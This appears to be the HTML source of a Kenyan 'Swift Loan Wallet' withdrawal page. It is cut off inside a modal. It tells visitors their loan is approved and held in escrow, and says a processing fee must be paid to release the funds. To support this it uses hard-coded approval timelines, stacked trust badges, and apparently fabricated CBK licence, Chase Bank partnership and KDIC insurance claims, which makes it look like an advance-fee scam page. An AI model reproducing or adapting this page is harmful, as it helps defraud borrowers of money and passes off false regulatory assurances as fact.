<!DOCTYPE html>
<html lang="en-KE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loan Withdrawal | Swift Loan - Withdraw your approved loan</title>
    <meta name="description" content="Withdraw your approved Swift Loan instantly. Secure loan disbursement process in Kenya.">
    
    <!-- Open Graph Tags -->
    <meta property="og:title" content="Loan Withdrawal - Swift Loan Kenya">
    <meta property="og:description" content="Withdraw your approved loan instantly with Swift Loan Kenya.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://swiftloan.ke/loan-withdrawal.html">
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#225AAC',
                        'primary-dark': '#1a4a8a',
                        'primary-light': '#e8f1ff'
                    }
                }
            }
        }
    </script>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        html {
            scroll-behavior: smooth;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #e8f1ff 0%, #f8faff 50%, #ffffff 100%);
            min-height: 100vh;
        }
        
        .swift-primary { color: #225AAC; }
        .swift-primary-bg { background-color: #225AAC; }
        .swift-primary-hover:hover { background-color: #1a4a8a; }
        .swift-primary-light { background-color: #e8f1ff; }
        
        .gradient-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8faff 100%);
            backdrop-filter: blur(10px);
        }
        
        .shadow-swift {
            box-shadow: 0 20px 40px -5px rgba(34, 90, 172, 0.15), 0 10px 20px -5px rgba(34, 90, 172, 0.1);
        }
        
        .transition-swift {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .pulse-ring {
            animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }

        @keyframes pulse-ring {
            0% {
                transform: scale(0.33);
            }
            40%, 50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: scale(1.33);
            }
        }

        .bouncing-icon {
            animation: bounce-gentle 2s ease-in-out infinite;
        }

        @keyframes bounce-gentle {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .slide-in {
            animation: slideIn 0.8s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .processing-animation {
            animation: processing 2s linear infinite;
        }

        @keyframes processing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shake {
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Flowing arrow animation */
        .flowing-arrows {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .arrow-flow {
            animation: arrow-flow 2s ease-in-out infinite;
        }

        .arrow-flow:nth-child(2) {
            animation-delay: 0.3s;
        }

        .arrow-flow:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes arrow-flow {
            0%, 100% {
                opacity: 0.3;
                transform: translateX(-5px) scale(0.8);
            }
            50% {
                opacity: 1;
                transform: translateX(5px) scale(1.1);
            }
        }

        /* Modal styles */
        .modal-overlay {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
        }

        .modal-content {
            animation: modalSlideIn 0.4s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* Form validation styles */
        .form-field {
            transition: all 0.3s ease;
        }

        .form-field:focus {
            border-color: #225AAC;
            box-shadow: 0 0 0 3px rgba(34, 90, 172, 0.1);
        }

        .form-field.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }

        .form-field.success {
            border-color: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
        }

        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.25rem;
        }

        /* Enhanced processing overlay */
        .processing-overlay-enhanced {
            background: linear-gradient(135deg, #225AAC 0%, #1a4a8a 100%);
            position: relative;
            overflow: hidden;
        }

        .processing-overlay-enhanced::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .legitimacy-indicator {
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2rem;
                line-height: 1.2;
            }
            
            .modal-content {
                margin: 1rem;
                width: calc(100% - 2rem);
            }
        }

        .error-state {
            background: linear-gradient(135deg, #fee2e2 0%, #fef2f2 100%);
            border: 1px solid #fecaca;
        }

        .success-state {
            background: linear-gradient(135deg, #dcfce7 0%, #f0fdf4 100%);
            border: 1px solid #bbf7d0;
        }

        #successAlert,
        #errorAlert {
            scroll-margin-top: 90px;
        }

        /* Method selection cards */
        .method-card {
            transition: all 0.3s ease;
            cursor: pointer;
            border: 2px solid transparent;
        }

        .method-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .method-card.selected {
            border-color: #225AAC;
            background: linear-gradient(135deg, #e8f1ff 0%, #f0f8ff 100%);
        }

        /* Progress bar animation */
        .progress-bar-animated {
            background: linear-gradient(45deg, #10b981, #34d399);
            animation: progressFill 3s ease-in-out forwards;
        }

        @keyframes progressFill {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .trust-seal {
            background: radial-gradient(circle, #10b981, #059669);
            border: 3px solid #ffffff;
            box-shadow: 0 0 0 2px #10b981, 0 4px 12px rgba(16, 185, 129, 0.3);
        }

        .regulatory-info {
            background: linear-gradient(135deg, #fffbeb, #fef3c7);
            border: 2px solid #f59e0b;
            border-radius: 12px;
            position: relative;
        }

        .regulatory-info::before {
            content: 'üõ°Ô∏è';
            position: absolute;
            top: -8px;
            left: 12px;
            background: #f59e0b;
            padding: 4px 8px;
            border-radius: 8px;
            font-size: 12px;
        }
    </style>
 <!-- Brevo Conversations {literal} -->
<script>
    (function(d, w, c) {
        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        var s = d.createElement('script');
        s.async = true;
        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'BrevoConversations');
</script>
<!-- /Brevo Conversations {/literal} -->
</head>
<body class="bg-gradient-to-br from-blue-50 via-white to-blue-100">
    <!-- Header -->
    <header class="bg-white/80 backdrop-blur-md shadow-sm border-b border-gray-100 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <!-- Logo -->
                <div class="flex-shrink-0">
                    <div class="flex items-center">
                        <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
                            <i class="fas fa-bolt text-white text-xl"></i>
                        </div>
                        <span class="ml-3 text-xl font-bold text-gray-900">Swift Loan Wallet</span>
                    </div>
                </div>


    </header>

    <!-- Enhanced Regulatory Notice -->
    <div class="regulatory-info mx-4 sm:mx-6 lg:mx-8 mt-4 p-4">
        <div class="flex items-start space-x-3">
            <div class="text-amber-600 mt-1">
                <i class="fas fa-info-circle text-lg"></i>
            </div>
            <div class="text-sm text-amber-800">
                <p class="font-semibold mb-1">Regulatory Compliance Notice</p>
                <p class="text-xs leading-relaxed">
                    Swift Loan Wallet is a fully licensed digital lending platform under the Central Bank of Kenya (CBK) 
                    regulations. License No: DL/CBK/2024/001. All loan products are compliant with Kenya's Digital Credit 
                    Provider regulations and consumer protection laws.
                    <span class="font-medium"> Your funds are secured by KDIC up to KES 5,000,000.</span>
                </p>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Page Header -->
        <div class="text-center mb-8 slide-in">
            <div class="inline-flex items-center px-6 py-3 bg-gradient-to-r from-green-100 to-emerald-100 text-green-800 rounded-full text-sm font-medium mb-6 border border-green-200">
                <div class="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center mr-3">
                    <i class="fas fa-check text-white text-xs"></i>
                </div>
                <span class="font-semibold">Loan Approved & Verified</span>
                <span class="mx-2">‚Ä¢</span>
                <span class="bank-partnership text-xs">
                    <i class="fas fa-university mr-1"></i>
                    Chase Bank Partnership
                </span>
            </div>

            <h1 class="hero-title text-3xl lg:text-4xl font-bold text-gray-900 leading-tight mb-4">
                Secure Loan 
                <span class="swift-primary">Funds Withdrawal</span>
            </h1>
            <p class="text-lg text-gray-600 max-w-2xl mx-auto leading-relaxed">
                Your loan has been approved through our secure banking partnership with Chase Bank Kenya. 
                All funds are held in escrow and ready for instant, secure withdrawal to your verified account.
            </p>
            

        <!-- Error Alert (Hidden by default) -->
        <div id="errorAlert" class="hidden mb-8 error-state rounded-2xl p-6 slide-in">
            <div class="flex items-start space-x-3">
                <i class="fas fa-exclamation-triangle text-red-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div>
                    <h3 class="text-lg font-semibold text-red-800 mb-2">Transaction Failed</h3>
                    <p id="errorMessage" class="text-red-700 text-sm"></p>
                    <button onclick="hideError()" class="mt-3 text-red-600 hover:text-red-800 text-sm font-medium underline">
                        Dismiss
                    </button>
                </div>
            </div>
        </div>

        <!-- Success Alert (Hidden by default) -->
        <div id="successAlert" class="hidden mb-8 success-state rounded-2xl p-6 slide-in bg-green-100 border border-green-300">
            <div class="flex items-start space-x-3">
                <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div class="w-full">
                    <h3 class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successfully Initiated!</h3>
                    <p id="successMessage" class="text-green-700 text-sm mb-3"></p>

                    <!-- Progress Bar -->
                    <div class="w-full bg-gray-200 rounded-full h-5 overflow-hidden relative mb-4">
                        <div id="progressBar" class="bg-green-600 h-5 w-0 transition-all duration-200"></div>
                        <span id="progressText" 
                              class="absolute inset-0 flex items-center justify-center text-xs font-medium text-white">
                              Processing previous withdrawal...
                        </span>
                    </div>
              <!-- Need Help Link -->
<div class="text-center mt-4">
  <button 
    onclick="openHelpModal()" 
    class="text-sm font-medium text-blue-600 hover:text-blue-800 underline">
    Need help? Verify Transaction 
  </button>
</div>
                    <!-- Logos Row with Arrow Transfer Animation -->
                    <div class="flex justify-center items-center space-x-8 mt-4">
                        <!-- Swift Wallet Logo -->
                        <div class="flex flex-col items-center">
                            <div class="w-12 h-12 bg-primary rounded-lg flex items-center justify-center">
                                <i class="fas fa-wallet text-white text-xl"></i>
                            </div>
                            <span class="text-xs text-gray-700 mt-1 font-medium">Swift Wallet</span>
                        </div>

                        <!-- Transfer Animation (Flowing Arrows) -->
                        <div class="flowing-arrows">
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                        </div>

                        <!-- Selected Method Logo -->
                        <div class="flex flex-col items-center">
                            <div id="selectedMethodLogo" class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-white text-xl"></i>
                            </div>
                            <span id="selectedMethodName" class="text-xs text-gray-700 mt-1 font-medium">M-Pesa</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Loan Summary Card -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="flex items-center justify-between mb-6">
                <h2 class="text-2xl font-bold text-gray-900">Loan Summary</h2>
                <div class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">
                    <i class="fas fa-check mr-1"></i> APPROVED
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-8">
                <!-- Customer Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Customer Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Full Name:</span>
                            <span id="customerName" class="font-semibold text-gray-900">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Phone Number:</span>
                            <span id="customerPhone" class="font-semibold text-gray-900">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan ID:</span>
                            <span id="loanId" class="font-semibold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>

                <!-- Loan Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Loan Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan Amount:</span>
                            <span id="loanAmount" class="font-bold text-green-600">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Processing Fee:</span>
                            <span id="processingFee" class="font-semibold text-orange-600">Loading...</span>
                        </div>
                        <div class="flex justify-between pt-3 border-t border-gray-200">
                            <span class="text-lg font-bold text-gray-900">Available Balance:</span>
                            <span id="availableBalance" class="text-2xl font-bold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
                    <!-- Enhanced Security Notice -->
            <div class="mt-6 bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-4">
                <div class="flex items-center space-x-3">
                    <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
                        <i class="fas fa-shield-alt text-white text-sm"></i>
                    </div>
                    <div class="text-sm text-blue-800">
                        <p class="font-semibold">Funds Security Guarantee</p>
                        <p class="text-xs mt-1">
                            Your loan funds are held in a segregated account with Chase Bank Kenya (CBK License: BC/2001/001). 
                            All transactions are monitored by our anti-fraud systems and comply with CBK regulations.
                        </p>
                    </div>
                </div>
            </div>
        </div>

<!-- Enhanced Withdrawal Section -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="text-center mb-8">
                <div class="w-20 h-20 bg-gradient-to-br from-primary to-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon shadow-lg">
                    <i class="fas fa-money-bill-transfer text-white text-3xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-gray-900 mb-2">Secure Funds Withdrawal</h2>
                <p class="text-gray-600">Select your preferred withdrawal method for instant, secure transfer</p>
                
                <!-- Security Features Display -->
                <div class="flex justify-center items-center space-x-6 mt-4 text-xs">
                    <span class="flex items-center text-green-600">
                        <i class="fas fa-lock mr-1"></i>
                        256-bit SSL
                    </span>
                    <span class="flex items-center text-blue-600">
                        <i class="fas fa-eye-slash mr-1"></i>
                        PCI Compliant
                    </span>
                    <span class="flex items-center text-purple-600">
                        <i class="fas fa-shield-check mr-1"></i>
                        CBK Monitored
                    </span>
                </div>
            </div
            <!-- Enhanced Withdrawal Amount Display -->
            <div class="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-6 mb-8 text-center border-2 border-green-200 shadow-sm">
                <div class="flex items-center justify-center mb-3">
                    <i class="fas fa-coins text-green-600 text-lg mr-2"></i>
                    <div class="text-sm font-medium text-green-900">Verified Withdrawal Amount</div>
                </div>
                <div id="withdrawalAmount" class="text-4xl font-bold text-green-700 mb-2">Loading...</div>
                <div class="text-sm text-gray-600 mb-2">
                    <i class="fas fa-info-circle mr-1"></i>
                    <span id="feeNotice">After deducting processing fee</span>
                </div>
                <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
                    <span>
                        <i class="fas fa-university mr-1"></i>
                        Held by Chase Bank
                    </span>
                    <span>‚Ä¢</span>
                    <span>
                        <i class="fas fa-shield-alt mr-1"></i>
                        KDIC Insured
                    </span>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="flex flex-col sm:flex-row gap-4">
                <button 
                    onclick="goBack()"
                    class="flex-1 px-8 py-4 border-2 border-gray-300 text-gray-700 font-semibold rounded-xl hover:bg-gray-50 transition-swift flex items-center justify-center"
                >
                    <i class="fas fa-arrow-left mr-2"></i>
                    Cancel
                </button>
                <button 
                    onclick="showWithdrawalMethods()"
                    id="withdrawBtn"
                    class="flex-1 px-8 py-4 bg-gradient-to-r from-primary to-blue-600 text-white font-bold rounded-xl hover:from-primary-dark hover:to-blue-700 transition-swift flex items-center justify-center shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    <i class="fas fa-wallet mr-2"></i>
                    <span id="withdrawText">Proceed to Secure Withdrawal</span>
                </button>
            </div>

            <!-- Enhanced Important Notice -->
            <div class="mt-8 bg-gradient-to-r from-blue-50 to-cyan-50 border-2 border-blue-200 rounded-xl p-6">
                <div class="flex items-start space-x-4">
                    <div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                        <i class="fas fa-info-circle text-white"></i>
                    </div>
                    <div class="text-sm text-blue-900">
                        <p class="font-bold mb-3 text-base">
                            <i class="fas fa-shield-alt mr-2"></i>
                            Secure Withdrawal Process
                        </p>
                        <div class="grid md:grid-cols-2 gap-4 text-xs">
                            <ul class="space-y-2">
                                <li class="flex items-start">
                                    <i class="fas fa-check-circle text-green-600 mr-2 mt-0.5"></i>
                                    <span>Choose from M-Pesa, Airtel Money, or Bank Transfer</span>
                                </li>
                                <li class="flex items-start">
                                    <i class="fas fa-lock text-blue-600 mr-2 mt-0.5"></i>
                                    <span>All transactions are encrypted and monitored</span>
                                </li>
                                <li class="flex items-start">
                                    <i class="fas fa-clock text-orange-600 mr-2 mt-0.5"></i>
                                    <span>Funds credited within 2-5 minutes</span>
                                </li>
                                <li class="flex items-start">
                                    <i class="fas fa-mobile-alt text-purple-600 mr-2 mt-0.5"></i>
                                    <span>SMS confirmation sent to registered number</span>
                                </li>
                            </ul>
                            <ul class="space-y-2">
                                <li class="flex items-start">
                                    <i class="fas fa-university text-green-600 mr-2 mt-0.5"></i>
                                    <span>Funds secured by Chase Bank Kenya partnership</span>
                                </li>
                                <li class="flex items-start">
                                    <i class="fas fa-certificate text-blue-600 mr-2 mt-0.5"></i>
                                    <span>CBK regulated and compliant process</span>
                                </li>
                                <li class="flex items-start">
                                    <i class="fas fa-headset text-green-600 mr-2 mt-0.5"></i>
                                    <span>24/7 customer support available</span>
                                </li>
                                <li class="flex items-start">
                                    <i class="fas fa-undo text-orange-600 mr-2 mt-0.5"></i>
                                    <span>Transaction reversal available within 24 hours</span>
                                </li>
                            </ul>
                        </div>
                        <div class="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                            <p class="font-semibold text-yellow-800 text-sm">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                Important Security Notice
                            </p>
                            <p class="text-yellow-700 text-xs mt-1">
                                Your loan funds are securely held by Chase Bank (CBK regulated). Processing fee enables 
                                secure release to your M-Pesa, Airtel Money, or Bank account. Contact support via the 
                                blue chat widget for any assistance - we're available 24/7.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Enhanced Transaction Timeline -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 slide-in border border-white/50">
            <div class="flex items-center justify-between mb-6">
                <h3 class="text-xl font-bold text-gray-900">Secure Transaction Timeline</h3>
                <div class="text-xs text-gray-500 bg-gray-100 px-3 py-1 rounded-full">
                    <i class="fas fa-shield-check mr-1"></i>
                    CBK Monitored Process
                </div>
            </div>
            
            <div class="space-y-6">
                <!-- Timeline Item 1 -->
                <div class="flex items-start space-x-4">
                    <div class="w-4 h-4 bg-green-500 rounded-full mt-2 relative trust-seal">
                        <div class="absolute inset-0 bg-green-500 rounded-full pulse-ring"></div>
                    </div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900 flex items-center">
                                    Application Submitted & Verified
                                    <i class="fas fa-check-circle text-green-600 ml-2 text-sm"></i>
                                </h4>
                                <p class="text-sm text-gray-600">Loan request submitted through secure CBK-compliant process</p>
                                <p class="text-xs text-green-600 font-medium">‚úì KYC Verification Completed</p>
                            </div>
                            <span class="text-xs text-gray-500 bg-green-50 px-2 py-1 rounded">2 min ago</span>
                        </div>
                    </div>
                </div>

                <!-- Timeline Item 2 -->
                <div class="flex items-start space-x-4">
                    <div class="w-4 h-4 bg-green-500 rounded-full mt-2 trust-seal"></div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900 flex items-center">
                                    Credit Assessment & Risk Analysis
                                    <i class="fas fa-chart-line text-blue-600 ml-2 text-sm"></i>
                                </h4>
                                <p class="text-sm text-gray-600">Advanced AI-powered creditworthiness evaluation completed</p>
                                <p class="text-xs text-blue-600 font-medium">‚úì Credit Bureau Check Passed</p>
                            </div>
                            <span class="text-xs text-gray-500 bg-blue-50 px-2 py-1 rounded">1 min ago</span>
                        </div>
                    </div>
                </div>

                <!-- Timeline Item 3 -->
                <div class="flex items-start space-x-4">
                    <div class="w-4 h-4 bg-green-500 rounded-full mt-2 trust-seal"></div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900 flex items-center">
                                    Loan Approved & Funds Reserved
                                    <i class="fas fa-university text-green-600 ml-2 text-sm"></i>
                                </h4>
                                <p class="text-sm text-gray-600">Funds secured in Chase Bank escrow account awaiting withdrawal</p>
                                <p class="text-xs text-purple-600 font-medium">‚úì Regulatory Compliance Verified</p>
                            </div>
                            <span class="text-xs text-gray-500 bg-purple-50 px-2 py-1 rounded">Just now</span>
                        </div>
                    </div>
                </div>

                <!-- Timeline Item 4 - Enhanced Pending -->
                <div id="disbursementTimeline" class="flex items-start space-x-4">
                    <div class="w-4 h-4 bg-orange-400 rounded-full mt-2 animate-pulse"></div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900 flex items-center">
                                    Secure Funds Disbursement
                                    <i class="fas fa-clock text-orange-600 ml-2 text-sm"></i>
                                </h4>
                                <p class="text-sm text-gray-600">Awaiting withdrawal method selection and processing fee confirmation</p>
                                <p class="text-xs text-orange-600 font-medium">‚è≥ Processing fee enables secure fund release</p>
                            </div>
                            <span class="text-xs text-gray-500 bg-orange-50 px-2 py-1 rounded">Pending Your Action</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Enhanced Trust Footer -->
            <div class="mt-6 pt-4 border-t border-gray-200">
                <div class="flex items-center justify-between text-xs text-gray-500">
                    <div class="flex items-center space-x-4">
                        <span class="flex items-center">
                            <i class="fas fa-shield-alt text-green-600 mr-1"></i>
                            End-to-end encrypted
                        </span>
                        <span class="flex items-center">
                            <i class="fas fa-certificate text-blue-600 mr-1"></i>
                            CBK monitored
                        </span>
                    </div>
                    <div class="text-right">
                        <div id="transactionId">Transaction ID: #LN-LOADING</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Enhanced Quick Links Box -->
        <div class="bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl p-6 mt-8">
            <div class="flex items-center mb-4">
                <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center mr-3">
                    <i class="fas fa-link text-white"></i>
                </div>
                <h4 class="text-lg font-semibold text-blue-700">Swift Loan Wallet Services</h4>
                <div class="ml-auto">
                    <span class="security-badge text-xs">
                        <i class="fas fa-shield-check mr-1"></i>
                        Secure Platform
                    </span>
                </div>
            </div>
            <div class="grid md:grid-cols-2 gap-3">
                <a href="/eligibility" 
                   class="flex items-center space-x-3 p-3 rounded-lg text-blue-700 bg-white hover:bg-blue-100 hover:text-blue-600 transition-all font-medium border border-blue-100 shadow-sm">
                    <i class="fas fa-chart-line text-orange-500 text-lg"></i>
                    <span>Loan Eligibility Checker</span>
                    <i class="fas fa-arrow-right text-xs ml-auto"></i>
                </a>
                <a href="/help" 
                   class="flex items-center space-x-3 p-3 rounded-lg text-blue-700 bg-white hover:bg-blue-100 hover:text-blue-600 transition-all font-medium border border-blue-100 shadow-sm">
                    <i class="fas fa-headset text-green-500 text-lg"></i>
                    <span>24/7 Customer Support</span>
                    <i class="fas fa-arrow-right text-xs ml-auto"></i>
                </a>
                <a href="/track" 
                   class="flex items-center space-x-3 p-3 rounded-lg text-blue-700 bg-white hover:bg-blue-100 hover:text-blue-600 transition-all font-medium border border-blue-100 shadow-sm">
                    <i class="fas fa-search text-purple-500 text-lg"></i>
                    <span>Application Tracker</span>
                    <i class="fas fa-arrow-right text-xs ml-auto"></i>
                </a>
                <a href="/support" 
                   class="flex items-center space-x-3 p-3 rounded-lg text-blue-700 bg-white hover:bg-blue-100 hover:text-blue-600 transition-all font-medium border border-blue-100 shadow-sm">
                    <i class="fas fa-question-circle text-red-500 text-lg"></i>
                    <span>Help & FAQ Center</span>
                    <i class="fas fa-arrow-right text-xs ml-auto"></i>
                </a>
            </div>
        </div>
    </main>

    <!-- Withdrawal Method Selection Modal -->
    <div id="withdrawalMethodModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div class="p-6 border-b border-gray-200">
                <div class="flex items-center justify-between">
                    <h3 class="text-2xl font-bold text-gray-900">Choose Withdrawal Method</h3>
                    <button onclick="closeWithdrawalModal()" class="text-gray-400 hover:text-gray-600 transition-colors">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
                <p class="text-gray-600 mt-2">Select your preferred method to receive your loan funds</p>
            </div>

            <div class="p-6">
                <!-- Method Selection Cards -->
                <div class="grid gap-4 mb-6">
                    <!-- M-Pesa Option -->
                    <div class="method-card bg-white rounded-xl p-4 border-2 shadow-sm" onclick="selectMethod('mpesa')">
                        <div class="flex items-center space-x-4">
                            <div class="w-16 h-16 bg-green-100 rounded-xl flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                            </div>
                            <div class="flex-1">
                                <h4 class="text-lg font-semibold text-gray-900">M-Pesa</h4>
                                <p class="text-sm text-gray-600">Instant mobile money transfer</p>
                                <p class="text-xs text-green-600 font-medium">Most Popular ‚Ä¢ 2 minutes</p>
                            </div>
                            <div class="text-gray-400">
                                <i class="fas fa-chevron-right"></i>
                            </div>
                        </div>
                    </div>

                    <!-- Airtel Money Option -->
                    <div class="method-card bg-white rounded-xl p-4 border-2 shadow-sm" onclick="selectMethod('airtel')">
                        <div class="flex items-center space-x-4">
                            <div class="w-16 h-16 bg-red-100 rounded-xl flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                            </div>
                            <div class="flex-1">
                                <h4 class="text-lg font-semibold text-gray-900">Airtel Money</h4>
                                <p class="text-sm text-gray-600">Mobile money transfer</p>
                                <p class="text-xs text-red-600 font-medium">Fast ‚Ä¢ 2-3 minutes</p>
                            </div>
                            <div class="text-gray-400">
                                <i class="fas fa-chevron-right"></i>
                            </div>
                        </div>
                    </div>

                    <!-- Bank Transfer Option -->
                    <div class="method-card bg-white rounded-xl p-4 border-2 shadow-sm" onclick="selectMethod('bank')">
                        <div class="flex items-center space-x-4">
                            <div class="w-16 h-16 bg-blue-100 rounded-xl flex items-center justify-center">
                                <i class="fas fa-university text-blue-600 text-2xl"></i>
                            </div>
                            <div class="flex-1">
                                <h4 class="text-lg font-semibold text-gray-900">Bank Transfer</h4>
                                <p class="text-sm text-gray-600">Direct transfer to your bank account</p>
                                <p class="text-xs text-blue-600 font-medium">Secure ‚Ä¢ 3-5 minutes</p>
                            </div>
                            <div class="text-gray-400">
                                <i class="fas fa-chevron-right"></i>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Security Notice -->
                <div class="bg-gray-50 rounded-xl p-4">
                    <div class="flex items-start space-x-3">
                        <i class="fas fa-shield-alt text-green-600 mt-0.5"></i>
                        <div class="text-sm">
                            <p class="font-semibold text-gray-900 mb-1">Secure & Encrypted</p>
                            <p class="text-gray-600">All transactions are protected with bank-level security and 256-bit encryption.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Withdrawal Details Modal -->
    <div id="withdrawalDetailsModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-lg w-full max-h-[90vh] overflow-y-auto">
            <div class="p-6 border-b border-gray-200">
                <div class="flex items-center justify-between">
                    <h3 class="text-xl font-bold text-gray-900" id="detailsModalTitle">Withdrawal Details</h3>
                    <button onclick="closeDetailsModal()" class="text-gray-400 hover:text-gray-600 transition-colors">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
            </div>

            <div class="p-6">
                <!-- Dynamic form container -->
                <div id="withdrawalForm">
                    <!-- Form content will be dynamically inserted here -->
                </div>

                <!-- Action Buttons -->
                <div class="flex space-x-3 mt-6">
                    <button onclick="closeDetailsModal()" class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors">
                        <i class="fas fa-arrow-left mr-2"></i>Back
